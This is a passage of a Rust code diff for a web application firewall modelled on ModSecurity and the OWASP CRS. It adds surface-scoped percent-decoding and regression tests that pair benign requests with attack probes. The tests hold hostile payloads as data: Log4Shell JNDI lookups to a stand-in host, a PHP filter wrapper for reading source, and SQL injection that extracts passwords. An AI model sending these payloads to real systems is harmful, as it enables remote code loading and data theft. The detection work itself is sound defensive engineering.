@@ -642,6 +642,36 @@ impl Field {
         !matches!(self, Self::Multi(_) | Self::Headers | Self::Cookies)
     }
 
+    /// Whether this field's value reaches a rule percent-decoded upstream.
+    ///
+    /// Only meaningful for the scalar variants; composite fields decide per
+    /// surface in [`Self::any_value`] / [`Self::collect_values`].
+    const fn scalar_decoding(self) -> Decoding {
+        match self {
+            // ModSecurity normalises and percent-decodes the URI before
+            // exposing it (`REQUEST_FILENAME` / `REQUEST_URI`), and parses
+            // `ARGS` / `REQUEST_BODY` out of the escaped forms.
+            Self::Path | Self::Query | Self::Body => Decoding::Escaped,
+            // `REQUEST_HEADERS` is handed to rules exactly as received, and so
+            // are the engine-synthesised integers.
+            Self::Method
+            | Self::ContentLength
+            | Self::ContentType
+            | Self::UserAgent
+            | Self::PathLength
+            | Self::QueryArgCount
+            | Self::HeaderReferer
+            | Self::HeaderHost
+            | Self::HeaderRange
+            | Self::HeaderCount(_)
+            // Unreachable for the multi-valued variants, which never route
+            // through `scalar`; `Verbatim` is the conservative answer.
+            | Self::Multi(_)
+            | Self::Headers
+            | Self::Cookies => Decoding::Verbatim,
+        }
+    }
+
     /// The single value of a scalar field, or `None` for multi-valued fields
     /// and for scalar fields absent from the request.
     fn scalar(self, ctx: &RequestCtx) -> Option<Cow<'_, str>> {
@@ -678,29 +708,31 @@ impl Field {
     /// `matched_value` (`ModSecurity` `MATCHED_VARS`) condition can be applied
     /// to them, so the whole expansion is collected — but only after the head
     /// condition has already matched, so this never runs on ordinary traffic.
-    fn collect_values<'a>(self, ctx: &'a RequestCtx) -> Vec<Cow<'a, str>> {
+    fn collect_values<'a>(self, ctx: &'a RequestCtx) -> Vec<(Cow<'a, str>, Decoding)> {
+        let escaped = Decoding::Escaped;
+        let verbatim = Decoding::Verbatim;
         match self {
             Self::Multi(s) => {
-                let mut out: Vec<Cow<'a, str>> = Vec::new();
-                let header = |name: &str, out: &mut Vec<Cow<'a, str>>| {
+                let mut out: Vec<(Cow<'a, str>, Decoding)> = Vec::new();
+                let header = |name: &str, out: &mut Vec<(Cow<'a, str>, Decoding)>| {
                     if let Some(value) = ctx.headers.get(name) {
-                        out.push(Cow::Borrowed(value.as_str()));
+                        out.push((Cow::Borrowed(value.as_str()), verbatim));
                     }
                 };
                 if s.has(Surfaces::PATH) {
-                    out.push(Cow::Borrowed(ctx.path.as_str()));
+                    out.push((Cow::Borrowed(ctx.path.as_str()), escaped));
                 }
                 if s.has(Surfaces::QUERY) {
-                    out.push(Cow::Borrowed(ctx.query.as_str()));
+                    out.push((Cow::Borrowed(ctx.query.as_str()), escaped));
                 }
                 if s.has(Surfaces::BODY) {
-                    out.push(String::from_utf8_lossy(&ctx.body_preview));
+                    out.push((String::from_utf8_lossy(&ctx.body_preview), escaped));
                 }
                 if s.has(Surfaces::COOKIES) {
-                    out.extend(cookie_values(ctx).map(Cow::Borrowed));
+                    out.extend(cookie_values(ctx).map(|v| (Cow::Borrowed(v), escaped)));
                 }
                 if s.has(Surfaces::HEADER_VALUES) {
-                    out.extend(ctx.headers.values().map(|v| Cow::Borrowed(v.as_str())));
+                    out.extend(ctx.headers.values().map(|v| (Cow::Borrowed(v.as_str()), verbatim)));
                 }
                 if s.has(Surfaces::USER_AGENT) {
                     header("user-agent", &mut out);
@@ -713,30 +745,52 @@ impl Field {
             Self::Headers => ctx
                 .headers
                 .iter()
-                .flat_map(|(name, value)| [Cow::Borrowed(name.as_str()), Cow::Borrowed(value.as_str())])
+                .flat_map(|(name, value)| {
+                    [
+                        (Cow::Borrowed(name.as_str()), verbatim),
+                        (Cow::Borrowed(value.as_str()), verbatim),
+                    ]
+                })
                 .collect(),
-            Self::Cookies => cookie_values(ctx).map(Cow::Borrowed).collect(),
-            _ => self.scalar(ctx).into_iter().collect(),
+            Self::Cookies => cookie_values(ctx).map(|v| (Cow::Borrowed(v), escaped)).collect(),
+            _ => self
+                .scalar(ctx)
+                .map(|v| (v, self.scalar_decoding()))
+                .into_iter()
+                .collect(),
         }
     }
 
     /// Apply `f` to every value this field expands to, short-circuiting on the
     /// first `true`.
-    fn any_value(self, ctx: &RequestCtx, mut f: impl FnMut(&str) -> bool) -> bool {
+    ///
+    /// `f` is told, per value, whether the surface it came from is one
+    /// `ModSecurity` would have percent-decoded before a rule saw it.
+    fn any_value(self, ctx: &RequestCtx, mut f: impl FnMut(&str, Decoding) -> bool) -> bool {
+        let escaped = Decoding::Escaped;
+        let verbatim = Decoding::Verbatim;
         match self {
             Self::Multi(s) => {
-                let header = |name: &str, f: &mut dyn FnMut(&str) -> bool| ctx.headers.get(name).is_some_and(|v| f(v));
-                (s.has(Surfaces::PATH) && f(&ctx.path))
-                    || (s.has(Surfaces::QUERY) && f(&ctx.query))
-                    || (s.has(Surfaces::BODY) && f(&String::from_utf8_lossy(&ctx.body_preview)))
-                    || (s.has(Surfaces::COOKIES) && cookie_values(ctx).any(&mut f))
-                    || (s.has(Surfaces::HEADER_VALUES) && ctx.headers.values().any(|v| f(v)))
+                let header = |name: &str, f: &mut dyn FnMut(&str, Decoding) -> bool| {
+                    ctx.headers.get(name).is_some_and(|v| f(v, verbatim))
+                };
+                (s.has(Surfaces::PATH) && f(&ctx.path, escaped))
+                    || (s.has(Surfaces::QUERY) && f(&ctx.query, escaped))
+                    || (s.has(Surfaces::BODY) && f(&String::from_utf8_lossy(&ctx.body_preview), escaped))
+                    || (s.has(Surfaces::COOKIES) && cookie_values(ctx).any(|v| f(v, escaped)))
+                    || (s.has(Surfaces::HEADER_VALUES) && ctx.headers.values().any(|v| f(v, verbatim)))
                     || (s.has(Surfaces::USER_AGENT) && header("user-agent", &mut f))
                     || (s.has(Surfaces::REFERER) && header("referer", &mut f))
             }
-            Self::Headers => ctx.headers.iter().any(|(name, value)| f(name) || f(value)),
-            Self::Cookies => cookie_values(ctx).any(&mut f),
-            _ => self.scalar(ctx).as_deref().is_some_and(&mut f),
+            Self::Headers => ctx
+                .headers
+                .iter()
+                .any(|(name, value)| f(name, verbatim) || f(value, verbatim)),
+            Self::Cookies => cookie_values(ctx).any(|v| f(v, escaped)),
+            _ => self
+                .scalar(ctx)
+                .as_deref()
+                .is_some_and(|v| f(v, self.scalar_decoding())),
         }
     }
 }
@@ -754,33 +808,115 @@ fn cookie_values(ctx: &RequestCtx) -> impl Iterator<Item = &str> + '_ {
         .filter(|value| !value.is_empty())
 }
 
-/// Apply `f` to `raw` and, when `raw` looks percent/plus-encoded, to its
-/// single- and recursively-decoded forms, reporting *which* form matched.
+/// Whether a value arrives at a rule percent-decoded upstream.
 ///
-/// CRS attaches `t:urlDecodeUni` to its `@pm` / `@pmFromFile` rules, so phrase
-/// matching must see the decoded text.  The cheap "contains `%` or `+`" guard
-/// keeps the common (unencoded) case allocation-free.
+/// `ModSecurity` does not hand CRS the bytes off the wire.  `ARGS`,
+/// `REQUEST_COOKIES` and the normalised `REQUEST_URI` / `REQUEST_FILENAME` are
+/// percent-decoded by the parser before any rule runs, and most CRS rules for
+/// those surfaces additionally carry `t:urlDecodeUni`; the patterns are written
+/// accordingly.  `REQUEST_HEADERS` is the deliberate exception — a header value
+/// is delivered to the origin exactly as sent, so CRS leaves it alone, and its
+/// header rules are written against raw text.  Decoding a header anyway
+/// manufactures false positives: CRS-932131 looks for the shell construct
+/// `/name[index]`, which any ordinary `Referer` carrying `%5B0%5D` would
+/// produce once decoded.
+///
+/// Carried alongside each value so one matcher can serve both kinds of surface
+/// — a composite field such as `path+query+body+cookies+headers` mixes them.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Decoding {
+    /// Percent-encoded surface: test the raw and decoded forms.
+    Escaped,
+    /// Verbatim surface: test exactly what was received.
+    Verbatim,
+}
+
+/// `true` when percent-decoding `s` could possibly change it.
+///
+/// `%` starts an escape and `+` is the form-encoded space; a value holding
+/// neither is its own decoded form, so the caller can skip the decode and the
+/// allocation it needs.  This guard is what keeps ordinary unencoded traffic at
+/// the cost it had before decoded matching existed.
+///
+/// It runs once per rule per escaped surface — hundreds of times per request —
+/// so it scans a word at a time.  A plain `bytes().any(..)` loop measured
+/// ~125 us on a 2 KB unencoded query string, more than the CRS regexes the
+/// guard exists to skip.
+fn may_be_encoded(s: &str) -> bool {
+    /// `0x01` in every byte lane.
+    const ONES: u64 = u64::from_ne_bytes([0x01; 8]);
+    /// `0x80` in every byte lane.
+    const HIGHS: u64 = u64::from_ne_bytes([0x80; 8]);
+    const PERCENTS: u64 = u64::from_ne_bytes([b'%'; 8]);
+    const PLUSES: u64 = u64::from_ne_bytes([b'+'; 8]);
+
+    /// `true` when any byte lane of `word` is zero.
+    ///
+    /// Borrowing a `1` out of the lane above sets that lane's high bit exactly
+    /// when the lane was zero; `& !word` discards lanes that were already
+    /// >= 0x80 and merely borrowed.  Exact — no false positives.
+    const fn has_zero_lane(word: u64) -> bool {
+        word.wrapping_sub(ONES) & !word & HIGHS != 0
+    }
+
+    let bytes = s.as_bytes();
+    let mut chunks = bytes.chunks_exact(8);
+    for chunk in &mut chunks {
+        let Ok(lanes) = <[u8; 8]>::try_from(chunk) else {
+            // `chunks_exact(8)` yields nothing but 8-byte chunks; fall back to
+            // the byte scan rather than assume it.
+            return bytes.iter().any(|&b| b == b'%' || b == b'+');
+        };
+        let word = u64::from_ne_bytes(lanes);
+        if has_zero_lane(word ^ PERCENTS) || has_zero_lane(word ^ PLUSES) {
+            return true;
+        }
+    }
+    chunks.remainder().iter().any(|&b| b == b'%' || b == b'+')
+}
+
+/// Apply `f` to `raw` and, on a [`Decoding::Escaped`] surface that looks
+/// percent/plus-encoded, to its single- and recursively-decoded forms,
+/// reporting *which* form matched.
+///
+/// `ModSecurity` hands CRS patterns an already-decoded value: `ARGS`,
+/// `REQUEST_COOKIES` and `REQUEST_FILENAME` are percent-decoded by the parser
+/// before a rule ever sees them, and most CRS rules additionally attach
+/// `t:urlDecodeUni`.  A matcher that only inspected the raw bytes off the wire
+/// would therefore be evaded by writing the payload percent-encoded, which is
+/// the default way every HTTP client sends it anyway.
 ///
 /// The matched form is reported rather than a bare `bool` because
 /// `ModSecurity` `MATCHED_VARS` holds the *transformed* value: a follow-up
 /// condition in a chain must see the decoded text the first condition actually
 /// matched, not the raw bytes off the wire.
-fn matching_decoded_form(raw: &str, f: &mut dyn FnMut(&str) -> bool) -> Option<MatchForm> {
+///
+/// Generic rather than `&mut dyn FnMut` so the matcher — a regex step or a
+/// single `str` comparison — inlines into the raw-value test that answers
+/// almost every call.
+fn matching_form<F: FnMut(&str) -> bool>(raw: &str, decoding: Decoding, mut f: F) -> Outcome {
     if f(raw) {
-        return Some(MatchForm::Same);
+        return Outcome::Match(MatchForm::Same);
     }
-    if !raw.bytes().any(|b| b == b'%' || b == b'+') {
-        return None;
+    if decoding == Decoding::Verbatim || !may_be_encoded(raw) {
+        return Outcome::NoMatch;
     }
     let decoded = url_decode(raw);
     if decoded != raw && f(&decoded) {
-        return Some(MatchForm::Transformed(decoded));
+        return Outcome::Match(MatchForm::Transformed(decoded));
+    }
+    // A second pass can only differ when the first one left an escape behind,
+    // which is what a double-encoded payload does and ordinary traffic does
+    // not.  Checking that before recursing keeps the singly-encoded case — the
+    // overwhelmingly common one — down to a single decode allocation.
+    if !may_be_encoded(&decoded) {
+        return Outcome::NoMatch;
     }
     let recursive = url_decode_recursive(raw);
     if recursive != decoded && f(&recursive) {
-        return Some(MatchForm::Transformed(recursive));
+        return Outcome::Match(MatchForm::Transformed(recursive));
     }
-    None
+    Outcome::NoMatch
 }
 
 // ── Operands ──────────────────────────────────────────────────────────────────
@@ -904,14 +1040,28 @@ enum Outcome {
 }
 
 /// Carried between the conditions of one chained rule, for one request.
-#[derive(Default)]
 struct ChainState<'a> {
     /// The values the most recent condition matched — `ModSecurity`
-    /// `MATCHED_VAR` / `MATCHED_VARS`.
-    matched: Vec<Cow<'a, str>>,
+    /// `MATCHED_VAR` / `MATCHED_VARS` — each with the [`Decoding`] of the
+    /// surface it came from.
+    matched: Vec<(Cow<'a, str>, Decoding)>,
     /// `tx:0`..`tx:N` from the most recent condition that declared `capture`;
     /// index 0 is the whole match, as in `ModSecurity`.
     captures: Vec<String>,
+    /// The [`Decoding`] of the value those captures were taken from.
+    capture_decoding: Decoding,
+}
+
+impl Default for ChainState<'_> {
+    fn default() -> Self {
+        Self {
+            matched: Vec::new(),
+            captures: Vec::new(),
+            // Nothing has been captured yet; the conservative surface class is
+            // the one that decodes nothing.
+            capture_decoding: Decoding::Verbatim,
+        }
+    }
 }
 
 // ── Compiled rule ─────────────────────────────────────────────────────────────
@@ -941,7 +1091,11 @@ enum CompiledMatcher {
 impl CompiledMatcher {
     /// Test one value.  `Some` carries the form that matched, which becomes the
     /// `matched_value` seen by the next condition of a chain.
-    fn test(&self, value: &str, ctx: &RequestCtx, state: &ChainState<'_>) -> Outcome {
+    ///
+    /// `decoding` says whether the surface `value` came from is one upstream
+    /// would have percent-decoded; on a [`Decoding::Verbatim`] surface every
+    /// matcher tests the received bytes and nothing else.
+    fn test(&self, value: &str, decoding: Decoding, ctx: &RequestCtx, state: &ChainState<'_>) -> Outcome {
         let plain = |hit: bool| {
             if hit {
                 Outcome::Match(MatchForm::Same)
@@ -949,7 +1103,14 @@ impl CompiledMatcher {
                 Outcome::NoMatch
             }
         };
-        let decoded = |hit: Option<MatchForm>| hit.map_or(Outcome::NoMatch, Outcome::Match);
+        // Test the raw value, plus its decoded forms when the surface is one
+        // upstream decodes.  A macro rather than a closure so each matcher's
+        // test is monomorphised and inlines into the raw-value comparison.
+        macro_rules! forms {
+            ($f:expr) => {
+                matching_form(value, decoding, $f)
+            };
+        }
         macro_rules! operand {
             ($operand:expr) => {
                 match $operand.resolve(ctx, state) {
@@ -959,21 +1120,40 @@ impl CompiledMatcher {
             };
         }
         match self {
-            Self::Regex(re) => plain(re.is_match(value)),
+            // The CRS patterns are written against ModSecurity's decoded
+            // `ARGS` / `REQUEST_COOKIES` / `REQUEST_FILENAME`, so a raw-only
+            // test is bypassed by percent-encoding the payload.
+            Self::Regex(re) => forms!(|v: &str| re.is_match(v)),
+            // Deliberately raw-only.  The one shipped `contains` condition on a
+            // request surface is CRS-920610, which reads `REQUEST_URI_RAW` to
+            // flag an *unencoded* `#` in the URI — decoding it would turn every
+            // legitimately escaped `%23` into a block.  See the module test
+            // `contains_stays_raw_so_an_escaped_hash_is_not_a_raw_fragment`.
             Self::Contains(operand) => plain(value.contains(operand!(operand).as_ref())),
-            Self::Equals(operand) => plain(value == operand!(operand).as_ref()),
-            Self::StartsWith(operand) => plain(value.starts_with(operand!(operand).as_ref())),
-            Self::EndsWith(operand) => plain(value.ends_with(operand!(operand).as_ref())),
+            Self::Equals(operand) => {
+                let needle = operand!(operand);
+                forms!(|v: &str| v == needle.as_ref())
+            }
+            Self::StartsWith(operand) => {
+                let needle = operand!(operand);
+                forms!(|v: &str| v.starts_with(needle.as_ref()))
+            }
+            Self::EndsWith(operand) => {
+                let needle = operand!(operand);
+                forms!(|v: &str| v.ends_with(needle.as_ref()))
+            }
+            // Raw-only, and a no-op if it were not: `not_in` backs CRS-911100's
+            // method allow-list, upstream reads `REQUEST_METHOD` untransformed,
+            // and a method token cannot legally carry `%` or `+`.  Decoding a
+            // deny-by-default list can only ever widen what it rejects.
             Self::NotIn(list) => plain(!list.iter().any(|allowed| allowed.eq_ignore_ascii_case(value))),
+            // Raw-only: both operands read engine-synthesised integers
+            // (`content_length`, header counts) that no client can encode.
             Self::Gt(n) => plain(value.parse::<i64>().is_ok_and(|v| v > *n)),
             Self::Lt(n) => plain(value.parse::<i64>().is_ok_and(|v| v < *n)),
-            Self::MultiPattern(ac) => decoded(matching_decoded_form(value, &mut |v| ac.is_match(v))),
-            Self::DetectSqli => decoded(matching_decoded_form(value, &mut |v| {
-                libinjectionrs::detect_sqli(v.as_bytes()).is_injection()
-            })),
-            Self::DetectXss => decoded(matching_decoded_form(value, &mut |v| {
-                libinjectionrs::detect_xss(v.as_bytes()).is_injection()
-            })),
+            Self::MultiPattern(ac) => forms!(|v: &str| ac.is_match(v)),
+            Self::DetectSqli => forms!(|v: &str| libinjectionrs::detect_sqli(v.as_bytes()).is_injection()),
+            Self::DetectXss => forms!(|v: &str| libinjectionrs::detect_xss(v.as_bytes()).is_injection()),
         }
     }
 
@@ -1041,10 +1221,12 @@ impl Condition {
             return detect_injection(field, ctx, detector);
         }
         let empty = ChainState::default();
-        field.any_value(ctx, |value| match self.matcher.test(value, ctx, &empty) {
-            Outcome::Match(_) => !self.negate,
-            Outcome::NoMatch => self.negate,
-            Outcome::Unresolvable => false,
+        field.any_value(ctx, |value, decoding| {
+            match self.matcher.test(value, decoding, ctx, &empty) {
+                Outcome::Match(_) => !self.negate,
+                Outcome::NoMatch => self.negate,
+                Outcome::Unresolvable => false,
+            }
         })
     }
 
@@ -1052,35 +1234,43 @@ impl Condition {
     ///
     /// Returns `false` as soon as no value satisfies the condition, so the
     /// remaining links are never evaluated.
+    ///
+    /// Each subject carries the [`Decoding`] of the surface it originated from,
+    /// and a `matched_value` / `tx:N` link inherits it: re-testing the text a
+    /// previous condition matched must not start decoding a header value just
+    /// because it passed through a chain.
     fn advance<'a>(&self, ctx: &'a RequestCtx, state: &mut ChainState<'a>) -> bool {
-        let subjects: Vec<Cow<'a, str>> = match self.field {
+        let subjects: Vec<(Cow<'a, str>, Decoding)> = match self.field {
             CondField::Request(field) => field.collect_values(ctx),
             CondField::MatchedValue => std::mem::take(&mut state.matched),
             CondField::Capture(n) => state
                 .captures
                 .get(usize::from(n))
                 .cloned()
-                .map(Cow::Owned)
+                .map(|text| (Cow::Owned(text), state.capture_decoding))
                 .into_iter()
                 .collect(),
         };
 
-        let mut hits: Vec<Cow<'a, str>> = Vec::new();
-        for value in subjects {
-            match (self.matcher.test(&value, ctx, state), self.negate) {
-                (Outcome::Match(MatchForm::Same), false) | (Outcome::NoMatch, true) => hits.push(value),
-                (Outcome::Match(MatchForm::Transformed(decoded)), false) => hits.push(Cow::Owned(decoded)),
+        let mut hits: Vec<(Cow<'a, str>, Decoding)> = Vec::new();
+        for (value, decoding) in subjects {
+            match (self.matcher.test(&value, decoding, ctx, state), self.negate) {
+                (Outcome::Match(MatchForm::Same), false) | (Outcome::NoMatch, true) => hits.push((value, decoding)),
+                (Outcome::Match(MatchForm::Transformed(decoded)), false) => {
+                    hits.push((Cow::Owned(decoded), decoding));
+                }
                 _ => {}
             }
         }
-        if hits.is_empty() {
+        let Some((first, first_decoding)) = hits.first() else {
             return false;
-        }
+        };
 
         if self.capture
-            && let (CompiledMatcher::Regex(re), Some(first)) = (&self.matcher, hits.first())
+            && let CompiledMatcher::Regex(re) = &self.matcher
             && let Some(groups) = re.captures(first)
         {
+            state.capture_decoding = *first_decoding;
             state.captures = groups
                 .iter()
                 .map(|group| group.map_or_else(String::new, |m| m.as_str().to_owned()))
@@ -1131,6 +1321,13 @@ impl CompiledRule {
 /// [`super::MAX_DECODE_PASSES`] passes, currently 5) to catch `%`-encoded and
 /// double/triple-encoded evasion attempts.  For any other field, every value it
 /// expands to is tested in all three forms.
+///
+/// This path decodes *every* surface, including the header values that
+/// [`Decoding::Verbatim`] holds back from the pattern matchers.  That is
+/// deliberate and predates surface-scoped decoding: libinjection is a semantic
+/// tokeniser rather than a text pattern, so feeding it a decoded header cannot
+/// produce the class of false positive a decoded header produces for a CRS
+/// regex, and the extra coverage is worth keeping.
 fn detect_injection(field: Field, ctx: &RequestCtx, detector: impl Fn(&[u8]) -> bool) -> bool {
     // Helper: test raw, single-decoded, and recursively-decoded forms.
     let detect_with_decode = |raw: &str| -> bool {
@@ -1158,7 +1355,7 @@ fn detect_injection(field: Field, ctx: &RequestCtx, detector: impl Fn(&[u8]) -> 
             || (s.has(Surfaces::USER_AGENT) && header("user-agent"))
             || (s.has(Surfaces::REFERER) && header("referer"));
     }
-    field.any_value(ctx, detect_with_decode)
+    field.any_value(ctx, |value, _decoding| detect_with_decode(value))
 }
 
 // ── Loader ────────────────────────────────────────────────────────────────────
@@ -3646,5 +3843,668 @@ rules:
         assert_eq!(checker.rule_count(), 1);
         assert!(checker.check(&make_ctx("GET", "/a/b.png", 0)).is_some());
         assert!(checker.check(&make_ctx("GET", "/a/b.pdf", 0)).is_none());
+    }
+
+    // ── Surface-scoped percent-decoding ──────────────────────────────────────
+    //
+    // ModSecurity hands CRS an already-decoded `ARGS` / `REQUEST_COOKIES` /
+    // `REQUEST_FILENAME`, so every pattern operator has to see the decoded
+    // forms of those surfaces or the whole rule set is bypassed by sending the
+    // payload percent-encoded.  `REQUEST_HEADERS` is the exception upstream
+    // leaves raw, and these tests pin both halves of that split.
+
+    /// One end-to-end request shape, benign or hostile.
+    struct Probe {
+        label: &'static str,
+        method: &'static str,
+        path: &'static str,
+        query: &'static str,
+        body: &'static str,
+        headers: &'static [(&'static str, &'static str)],
+    }
+
+    const BROWSER: &[(&str, &str)] = &[
+        (
+            "user-agent",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
+        ),
+        (
+            "accept",
+            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        ),
+        ("accept-language", "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"),
+        ("accept-encoding", "gzip, deflate, br"),
+        ("host", "shop.example.com"),
+    ];
+
+    const FORM_POST: &[(&str, &str)] = &[
+        ("content-type", "application/x-www-form-urlencoded"),
+        ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
+        ("host", "shop.example.com"),
+    ];
+
+    fn probe_ctx(p: &Probe, paranoia: u8) -> RequestCtx {
+        let mut ctx = make_ctx(p.method, p.path, p.body.len() as u64);
+        ctx.query = p.query.into();
+        ctx.body_preview = Bytes::copy_from_slice(p.body.as_bytes());
+        for (name, value) in p.headers {
+            ctx.headers.insert((*name).to_owned(), (*value).to_owned());
+        }
+        let dc = DefenseConfig {
+            owasp_set: true,
+            owasp_paranoia: paranoia,
+            ..DefenseConfig::default()
+        };
+        ctx.host_config = Arc::new(HostConfig {
+            code: "test".into(),
+            host: "shop.example.com".into(),
+            defense_config: dc,
+            ..HostConfig::default()
+        });
+        ctx
+    }
+
+    /// The rule id `checker` blocks `p` with, or `None`.
+    fn verdict(checker: &OWASPCheck, p: &Probe, paranoia: u8) -> Option<String> {
+        checker.check(&probe_ctx(p, paranoia)).and_then(|d| d.rule_id)
+    }
+
+    /// Ordinary traffic, every shape that carries a `%` or a `+` for entirely
+    /// innocent reasons.
+    fn benign_probes() -> &'static [Probe] {
+        const JSON_POST: &[(&str, &str)] = &[
+            ("content-type", "application/json"),
+            ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
+            ("host", "shop.example.com"),
+        ];
+        const REFERER_AND_COOKIE: &[(&str, &str)] = &[
+            ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
+            (
+                "referer",
+                "https://www.google.com/search?q=%E4%B8%AD%E6%96%87+%E5%95%86%E5%93%81&oq=a%2Bb",
+            ),
+            (
+                "cookie",
+                "sid=8f3a%2Fb1d%3D%3D; lang=zh%2DCN; cart=%7B%22id%22%3A12%7D; _ga=GA1.2.1.1",
+            ),
+            ("host", "shop.example.com"),
+        ];
+        const MULTIPART: &[(&str, &str)] = &[
+            (
+                "content-type",
+                "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
+            ),
+            ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
+            ("host", "shop.example.com"),
+        ];
+
+        &[
+            Probe {
+                label: "browser page view",
+                method: "GET",
+                path: "/products/shoes",
+                query: "",
+                body: "",
+                headers: BROWSER,
+            },
+            Probe {
+                label: "urlencoded form POST (CJK, space, ampersand)",
+                method: "POST",
+                path: "/account/profile",
+                query: "",
+                body: "name=%E5%BC%A0%E4%B8%89&note=hello+world+%26+co&city=%E5%8C%97%E4%BA%AC",
+                headers: FORM_POST,
+            },
+            Probe {
+                label: "JSON body with escapes and a percent sign",
+                method: "POST",
+                path: "/api/v1/orders",
+                query: "",
+                body: r#"{"note":"line1\nline2 \"quoted\" 50%","pct":"100%"}"#,
+                headers: JSON_POST,
+            },
+            Probe {
+                label: "encoded redirect_uri in the query",
+                method: "GET",
+                path: "/oauth/callback",
+                query: "redirect=https%3A%2F%2Fexample.com%2Fpath%3Fa%3D1%26b%3D2&state=xyz",
+                body: "",
+                headers: BROWSER,
+            },
+            Probe {
+                label: "escaped percent sign (q=100%25)",
+                method: "GET",
+                path: "/search",
+                query: "q=100%25&sort=price",
+                body: "",
+                headers: BROWSER,
+            },
+            Probe {
+                label: "bare, malformed percent (discount=50%)",
+                method: "GET",
+                path: "/deals",
+                query: "discount=50%",
+                body: "",
+                headers: BROWSER,
+            },
+            Probe {
+                label: "encoded Referer and Cookie",
+                method: "GET",
+                path: "/cart",
+                query: "",
+                body: "",
+                headers: REFERER_AND_COOKIE,
+            },
+            Probe {
+                label: "multipart upload",
+                method: "POST",
+                path: "/upload",
+                query: "",
+                body: "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; \
+                        name=\"file\"; filename=\"report 2026.pdf\"\r\nContent-Type: application/pdf\r\n\r\n%PDF-1.4 \
+                        hello\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n",
+                headers: MULTIPART,
+            },
+            Probe {
+                label: "path with %20 and +",
+                method: "GET",
+                path: "/files/report%202026%20final+v2.pdf",
+                query: "",
+                body: "",
+                headers: BROWSER,
+            },
+            Probe {
+                label: "path with an escaped hash",
+                method: "GET",
+                path: "/docs/chapter%231.html",
+                query: "",
+                body: "",
+                headers: BROWSER,
+            },
+            Probe {
+                label: "encoded array indices in the query",
+                method: "GET",
+                path: "/api/items",
+                query: "filter%5B0%5D%5Bfield%5D=name&filter%5B0%5D%5Bop%5D=eq",
+                body: "",
+                headers: BROWSER,
+            },
+            Probe {
+                label: "encoded array index in the Referer",
+                method: "GET",
+                path: "/p/1",
+                query: "",
+                body: "",
+                headers: &[
+                    ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
+                    ("referer", "https://shop.example.com/list/tags%5B0%5D/page%202"),
+                    ("host", "shop.example.com"),
+                ],
+            },
+            Probe {
+                label: "search phrase using + as a space",
+                method: "GET",
+                path: "/search",
+                query: "q=how+to+select+from+a+menu",
+                body: "",
+                headers: BROWSER,
+            },
+            Probe {
+                label: "plus-addressed email in a form POST",
+                method: "POST",
+                path: "/subscribe",
+                query: "",
+                body: "email=user%2Btag%40example.com&msg=A%20%26%20B%20%3C%20C",
+                headers: FORM_POST,
+            },
+            Probe {
+                label: "ordinary cookies including a bare 1",
+                method: "GET",
+                path: "/",
+                query: "",
+                body: "",
+                headers: &[
+                    ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
+                    ("cookie", "consent=1; sid=abc"),
+                    ("host", "shop.example.com"),
+                ],
+            },
+            Probe {
+                label: "ranged PDF download",
+                method: "GET",
+                path: "/files/manual.pdf",
+                query: "",
+                body: "",
+                headers: &[
+                    ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
+                    ("range", "bytes=0-1023"),
+                    ("host", "shop.example.com"),
+                ],
+            },
+        ]
+    }
+
+    /// Attacks in both their plain and their percent-encoded spelling.  Before
+    /// surface-scoped decoding the encoded column was a clean bypass of the 200+
+    /// `regex` conditions the shipped CRS set is almost entirely made of.
+    fn attack_probes() -> &'static [(Probe, Option<&'static str>)] {
+        // Pinned rule ids only where the encoded form used to slip through
+        // entirely; elsewhere any block is enough, because which rule wins
+        // depends on file order.
+        &[
+            (
+                Probe {
+                    label: "log4shell, encoded",
+                    method: "GET",
+                    path: "/",
+                    query: "x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D",
+                    body: "",
+                    headers: BROWSER,
+                },
+                Some("CRS-944150"),
+            ),
+            (
+                Probe {
+                    label: "log4shell, plain",
+                    method: "GET",
+                    path: "/",
+                    query: "x=${jndi:ldap://evil/a}",
+                    body: "",
+                    headers: BROWSER,
+                },
+                Some("CRS-944150"),
+            ),
+            (
+                Probe {
+                    label: "log4shell, double-encoded",
+                    method: "GET",
+                    path: "/",
+                    query: "x=%2524%257Bjndi%253Aldap%253A%252F%252Fevil%252Fa%257D",
+                    body: "",
+                    headers: BROWSER,
+                },
+                Some("CRS-944150"),
+            ),
+            (
+                Probe {
+                    label: "PHP stream wrapper, encoded",
+                    method: "GET",
+                    path: "/index.php",
+                    query: "page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex",
+                    body: "",
+                    headers: BROWSER,
+                },
+                Some("CRS-933140"),
+            ),
+            (
+                Probe {
+                    label: "PHP stream wrapper, plain",
+                    method: "GET",
+                    path: "/index.php",
+                    query: "page=php://filter/convert.base64-encode/resource=index",
+                    body: "",
+                    headers: BROWSER,
+                },
+                Some("CRS-933140"),
+            ),
+            (
+                Probe {
+                    label: "SQLi, encoded",
+                    method: "GET",
+                    path: "/item",
+                    query: "id=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--",
+                    body: "",
+                    headers: BROWSER,
+                },
+                None,
+            ),
+            (
+                Probe {
+                    label: "SQLi, plain",
+                    method: "GET",
+                    path: "/item",
+                    query: "id=1' UNION SELECT username,password FROM users--",
+                    body: "",
+                    headers: BROWSER,
+                },
+                None,
+            ),
+            (
+                Probe {
+                    label: "SQLi in an encoded form body",
+                    method: "POST",
+                    path: "/login",
+                    query: "",
+                    body: "user=admin%27%20OR%20%271%27%3D%271&pass=x",
